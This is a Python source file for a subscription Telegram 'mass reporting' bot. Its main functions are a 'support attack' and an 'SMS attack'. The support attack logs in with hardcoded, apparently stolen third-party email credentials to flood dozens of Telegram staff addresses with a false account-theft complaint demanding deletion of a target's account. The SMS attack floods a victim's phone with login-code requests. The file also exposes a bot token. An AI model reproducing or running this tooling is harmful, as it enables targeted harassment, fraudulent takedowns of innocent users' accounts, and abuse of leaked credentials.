"""
TenEvoy Reporter Bot — Mass reporting bot for Telegram
GitHub: https://github.com/yourusername/TenEvoyReporter
"""

import asyncio
import smtplib
import json
import os
import time
import random
import requests
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from aiogram import Bot, Dispatcher, types as atypes
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command

# ===== CONFIG (CHANGE THIS!) =====
BOT_TOKEN = "8783740903:AAGmt0alM8y-6ZhkJNZE39Lb4NPPHyexeoY"
ADMIN_ID = 8478884644
# =================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_states = {}

# Files for storage
SUBSCRIBERS_FILE = "data/subscribers.json"
BLACKLIST_FILE = "data/blacklist.json"
STATS_FILE = "data/stats.json"

os.makedirs("data", exist_ok=True)

def load_json(file, default=None):
    if default is None:
        default = {} if 'subscribers' in file else []
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_subscribers():
    return load_json(SUBSCRIBERS_FILE, {})

def save_subscribers(data):
    save_json(SUBSCRIBERS_FILE, data)

def load_blacklist():
    return load_json(BLACKLIST_FILE, [])

def save_blacklist(data):
    save_json(BLACKLIST_FILE, data)

def load_stats():
    default = {"total_reports": 0, "total_emails_sent": 0, "total_sms": 0, "total_sms_attacks": 0}
    return load_json(STATS_FILE, default)

def save_stats(data):
    save_json(STATS_FILE, data)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_subscribed(user_id):
    if is_admin(user_id):
        return True
    subs = load_subscribers()
    return str(user_id) in subs

def is_blacklisted(user_id):
    blacklist = load_blacklist()
    return user_id in blacklist

# ===== EMAIL SENDERS =====
EMAIL_SENDERS = {
    'message@krn.kz': 'servitsisifi30',
    'nuriketomsk@mail.ru': '777777',
    'miffs@mail.ru': 'Tel89260340597',
    '89189720171@mail.ru': '16031965',
    'lorik_999@mail.ru': '369258',
    'troyka@sibmail.com': 'nbvjatq',
}

# ===== TELEGRAM SUPPORT EMAILS (40+ addresses) =====
TELEGRAM_SUPPORT = [
    "support@telegram.org", "dmca@telegram.org", "security@telegram.org",
    "sms@telegram.org", "info@telegram.org", "marta@telegram.org",
    "spam@telegram.org", "alex@telegram.org", "abuse@telegram.org",
    "pavel@telegram.org", "durov@telegram.org", "elies@telegram.org",
    "ceo@telegram.org", "mr@telegram.org", "levlam@telegram.org",
    "perekopsky@telegram.org", "recover@telegram.org", "germany@telegram.org",
    "hyman@telegram.org", "qa@telegram.org", "Stickers@telegram.org",
    "ir@telegram.org", "vadim@telegram.org", "shyam@telegram.org",
    "stopca@telegram.org", "ask@telegram.org", "125support@telegram.org",
    "me@telegram.org", "enquiries@telegram.org", "api_support@telegram.org",
    "marketing@telegram.org", "ca@telegram.org", "recovery@telegram.org",
    "http@telegram.org", "corp@telegram.org", "corona@telegram.org",
    "ton@telegram.org", "sticker@telegram.org"
]

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        if 'gmail.com' in sender_email:
            smtp_server = 'smtp.gmail.com'
        elif 'rambler.ru' in sender_email:
            smtp_server = 'smtp.rambler.ru'
        elif 'mail.ru' in sender_email or 'bk.ru' in sender_email:
            smtp_server = 'smtp.mail.ru'
        else:
            return False
        
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except:
        return False

async def support_attack(message_obj, phone_number, username):
    """Attack through Telegram support"""
    subject = "URGENT: My account was stolen!"
    body = f"""Здравствуйте уважаемая поддержка!

На ваших просторах, я наткнулся на мошенника который украл мой аккаунт:
Номер: +{phone_number}
Username: @{username}

Я много раз пытался войти обратно, но не получается.
Прошу удалить сессии либо аккаунт.

Спасибо!"""
    
    total = len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)
    sent = 0
    
    await message_obj.reply(f"🎯 АТАКА НА ПОДДЕРЖКУ TELEGRAM!\n📞 Номер: +{phone_number}\n📨 0/{total}")
    
    for sender_email, sender_password in EMAIL_SENDERS.items():
        for receiver in TELEGRAM_SUPPORT:
            if send_email(receiver, sender_email, sender_password, subject, body):
                sent += 1
            await asyncio.sleep(0.3)
    
    stats = load_stats()
    stats["total_reports"] += 1
    stats["total_emails_sent"] += sent
    save_stats(stats)
    
    await message_obj.reply(f"✅ АТАКА ЗАВЕРШЕНА!\n📞 +{phone_number}\n📨 {sent}/{total}\n🔥 ЖАЛОБЫ ОТПРАВЛЕНЫ!")

async def sms_attack(message_obj, phone_number):
    phone_number = phone_number.replace('+', '').replace(' ', '').replace('-', '')
    
    if not phone_number.isdigit() or len(phone_number) < 10:
        await message_obj.reply("❌ Invalid format! Example: 79991234567")
        return
    
    total_requests = 30
    success = 0
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    await message_obj.reply(f"📱 SMS ATTACK STARTED!\n📞 +{phone_number}\n📨 0/{total_requests}")
    
    for i in range(total_requests):
        try:
            response = requests.post(
                'https://my.telegram.org/auth/send_password',
                headers=headers,
                data={'phone': '+' + phone_number},
                timeout=5
            )
            if response.status_code in [200, 302]:
                success += 1
            await asyncio.sleep(random.uniform(1, 2))
        except:
            await asyncio.sleep(2)
    
    stats = load_stats()
    stats["total_sms_attacks"] += 1
    stats["total_sms"] += success
    save_stats(stats)
    
    await message_obj.reply(f"✅ SMS ATTACK FINISHED!\n📞 +{phone_number}\n📨 {total_requests}\n✅ Success: {success}")

async def get_user_id(username):
    try:
        if username.startswith('@'):
            username = username[1:]
        chat = await bot.get_chat(f"@{username}")
        return chat.id, chat.username, chat.first_name
    except:
        return None, None, None

# ===== KEYBOARDS =====
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👤 Report user"), KeyboardButton(text="📢 Report channel")],
            [KeyboardButton(text="🤖 Report bot"), KeyboardButton(text="💬 Report chat")],
            [KeyboardButton(text="🎯 Support attack"), KeyboardButton(text="📱 SMS attack")],
            [KeyboardButton(text="🆔 Get ID"), KeyboardButton(text="📊 Stats")],
            [KeyboardButton(text="❌ Cancel"), KeyboardButton(text="👑 Admin panel")]
        ],
        resize_keyboard=True
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👥 Subscribers"), KeyboardButton(text="➕ Add user")],
            [KeyboardButton(text="❌ Remove user"), KeyboardButton(text="🛡️ Blacklist")],
            [KeyboardButton(text="📊 Statistics"), KeyboardButton(text="📧 Email list")],
            [KeyboardButton(text="🚪 Exit")]
        ],
        resize_keyboard=True
    )

# ===== COMMANDS =====
@dp.message(Command("start"))
async def cmd_start(message: atypes.Message):
    user_id = message.from_user.id
    
    if is_blacklisted(user_id):
        await message.reply("❌ You are blacklisted!")
        return
    
    if not is_subscribed(user_id):
        await message.reply("❌ No active subscription!\n\nContact: @anti_account")
        return
    
    stats = load_stats()
    
    await message.reply(
        f"🤖 TenEvoy Reporter Bot\n\n"
        f"📧 Email senders: {len(EMAIL_SENDERS)}\n"
        f"📬 Telegram support: {len(TELEGRAM_SUPPORT)}\n"
        f"📨 Emails per attack: {len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)}\n"
        f"📱 SMS attack: Telegram API\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📊 Total reports: {stats['total_reports']}\n"
        f"📧 Emails sent: {stats['total_emails_sent']}\n"
        f"📱 SMS attacks: {stats['total_sms_attacks']}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👨‍💻 @anti_account\n\n"
        f"Choose action:",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("admin"))
async def cmd_admin(message: atypes.Message):
    if not is_admin(message.from_user.id):
        await message.reply("❌ Access denied!")
        return
    
    stats = load_stats()
    subs = load_subscribers()
    
    await message.reply(
        f"👑 Admin panel\n\n"
        f"👥 Subscribers: {len(subs)}\n"
        f"🚫 Blacklisted: {len(load_blacklist())}\n"
        f"📧 Email senders: {len(EMAIL_SENDERS)}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📊 Total reports: {stats['total_reports']}\n"
        f"📧 Emails sent: {stats['total_emails_sent']}\n"
        f"📱 SMS attacks: {stats['total_sms_attacks']}\n"
        f"📱 SMS requests: {stats['total_sms']}\n\n"
        f"Choose action:",
        reply_markup=get_admin_keyboard()
    )

# ===== BUTTON HANDLERS =====
@dp.message()
async def handle_buttons(message: atypes.Message):
    user_id = message.from_user.id
    text = message.text
    
    if text == "❌ Cancel" or text == "/cancel":
        if user_id in user_states:
            del user_states[user_id]
        await message.reply("✅ Cancelled", reply_markup=get_main_keyboard())
        return
    
    if text == "🚪 Exit":
        await message.reply("Main menu", reply_markup=get_main_keyboard())
        return
    
    if is_blacklisted(user_id):
        await message.reply("❌ You are blacklisted!")
        return
    
    # ===== ADMIN FUNCTIONS =====
    if is_admin(user_id):
        if text == "➕ Add user":
            await message.reply("Send user ID:\nExample: 123456789")
            user_states[user_id] = {'action': 'admin_add_user'}
            return
        
        if text == "❌ Remove user":
            await message.reply("Send user ID:\nExample: 123456789")
            user_states[user_id] = {'action': 'admin_remove_user'}
            return
        
        if text == "👥 Subscribers":
            subs = load_subscribers()
            if not subs:
                await message.reply("📭 No subscribers")
            else:
                txt = "📋 Subscribers:\n\n"
                for i, uid in enumerate(list(subs.keys())[:30], 1):
                    txt += f"{i}. {uid}\n"
                await message.reply(txt)
            return
        
        if text == "🛡️ Blacklist":
            bl = load_blacklist()
            if not bl:
                await message.reply("📭 Blacklist empty")
            else:
                txt = "🚫 Blacklist:\n\n"
                for i, uid in enumerate(bl[:30], 1):
                    txt += f"{i}. {uid}\n"
                await message.reply(txt)
            return
        
        if text == "📊 Statistics":
            stats = load_stats()
            await message.reply(
                f"📊 Detailed statistics\n\n"
                f"📋 Total reports: {stats['total_reports']}\n"
                f"📧 Emails sent: {stats['total_emails_sent']}\n"
                f"📱 SMS attacks: {stats['total_sms_attacks']}\n"
                f"📱 SMS requests: {stats['total_sms']}"
            )
            return
        
        if text == "📧 Email list":
            txt = "📧 Email senders:\n\n"
            for i, email in enumerate(list(EMAIL_SENDERS.keys())[:20], 1):
                txt += f"{i}. {email}\n"
            await message.reply(txt)
            return
    
    # ===== USER FUNCTIONS =====
    if not is_subscribed(user_id):
        await message.reply("❌ No active subscription!")
        return
    
    if text == "🆔 Get ID":
        user_states[user_id] = {'action': 'get_id'}
        await message.reply(
            "🆔 Get user ID\n\n"
            "Send username:\n"
            "@durov or just durov\n\n"
            "Or /cancel"
        )
        return
    
    if text == "📊 Stats":
        stats = load_stats()
        await message.reply(
            f"📊 Your statistics\n\n"
            f"📋 Total reports: {stats['total_reports']}\n"
            f"📧 Emails sent: {stats['total_emails_sent']}"
        )
        return
    
    if text == "📱 SMS attack":
        user_states[user_id] = {'action': 'sms_attack'}
        await message.reply(
            "📱 SMS attack\n\n"
            "Send phone number:\n"
            "79991234567 or +79991234567\n\n"
            "⚠️ Number will receive ~30 SMS\n\n"
            "Or /cancel"
        )
        return
    
    if text == "🎯 Support attack":
        user_states[user_id] = {'action': 'support_attack'}
        await message.reply(
            "🎯 Telegram Support Attack\n\n"
            "Send data in format:\n"
            "phone_number username\n\n"
            "Example:\n"
            "79991234567 durov\n\n"
            "⚠️ Will send emails to 40+ Telegram support addresses\n\n"
            "Or /cancel"
        )
        return
    
    if text == "👤 Report user":
        user_states[user_id] = {'action': 'report_user'}
        await message.reply(
            "👤 Report user\n\n"
            "Send data (space separated):\n"
            "username id chat_link violation_link\n\n"
            "Example:\n"
            "@durov 777000 https://t.me/chat/1 https://t.me/chat/2\n\n"
            "Or /cancel"
        )
        return
    
    if text == "📢 Report channel":
        user_states[user_id] = {'action': 'report_channel'}
        await message.reply(
            "📢 Report channel\n\n"
            "Send data (space separated):\n"
            "channel_link violation_link\n\n"
            "Example:\n"
            "https://t.me/bad_channel https://t.me/bad_channel/123\n\n"
            "Or /cancel"
        )
        return
    
    if text == "🤖 Report bot":
        user_states[user_id] = {'action': 'report_bot'}
        await message.reply(
            "🤖 Report bot\n\n"
            "Send bot username:\n"
            "@bad_bot\n\n"
            "Or /cancel"
        )
        return
    
    if text == "💬 Report chat":
        user_states[user_id] = {'action': 'report_chat'}
        await message.reply(
            "💬 Report chat\n\n"
            "Send chat link:\n"
            "https://t.me/joinchat/xxx\n\n"
            "Or /cancel"
        )
        return
    
    # ===== INPUT HANDLING =====
    state = user_states.get(user_id)
    
    if state and state.get('action') == 'get_id':
        username = text.strip()
        if username.startswith('@'):
            username = username[1:]
        
        await message.reply(f"🔍 Searching for @{username}...")
        
        try:
            chat = await bot.get_chat(f"@{username}")
            result_text = (
                f"🆔 Result:\n\n"
                f"👤 Name: {chat.first_name or 'Unknown'}\n"
                f"📝 Username: @{username}\n"
                f"🆔 ID: {chat.id}\n\n"
                f"💡 Copy this ID for use in bot"
            )
            await message.reply(result_text)
        except:
            await message.reply(f"❌ User @{username} not found!")
        
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'sms_attack':
        await sms_attack(message, text)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'support_attack':
        parts = text.split()
        if len(parts) < 2:
            await message.reply("❌ Invalid format!\nNeed: phone_number username\nExample: 79991234567 durov")
            return
        phone = parts[0]
        username = parts[1]
        await support_attack(message, phone, username)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'admin_add_user':
        try:
            target_id = int(text.strip())
            subs = load_subscribers()
            subs[str(target_id)] = {"date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            save_subscribers(subs)
            await message.reply(f"✅ User {target_id} added to subscription!")
        except:
            await message.reply("❌ Invalid ID!")
        del user_states[user_id]
        await cmd_admin(message)
        return
    
    if state and state.get('action') == 'admin_remove_user':
        target_id = text.strip()
        subs = load_subscribers()
        if target_id in subs:
            del subs[target_id]
            save_subscribers(subs)
            await message.reply(f"✅ User {target_id} removed from subscription!")
        else:
            await message.reply(f"❌ User {target_id} not found")
        del user_states[user_id]
        await cmd_admin(message)
        return

# ===== START =====
async def main():
    print("=" * 50)
    print("🤖 TenEvoy Reporter Bot STARTED!")
    print("=" * 50)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📧 Email senders: {len(EMAIL_SENDERS)}")
    print(f"📬 Telegram support: {len(TELEGRAM_SUPPORT)}")
    print(f"📨 Emails per attack: {len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)}")
    print(f"📱 SMS attack: Telegram API")
    print(f"👨‍💻 Developer: @anti_account")
    print("=" * 50)
    print("\n✅ Bot ready! Send /start in Telegram")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
